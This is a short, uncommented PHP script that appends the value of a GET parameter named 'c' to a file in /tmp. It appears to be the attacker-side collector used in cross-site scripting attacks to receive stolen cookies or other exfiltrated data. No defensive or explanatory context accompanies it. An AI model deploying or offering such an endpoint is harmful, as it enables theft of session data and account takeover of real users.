<?php
if(!empty($_GET['c'])) {
    $logfile = fopen('/tmp/data.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}
?>
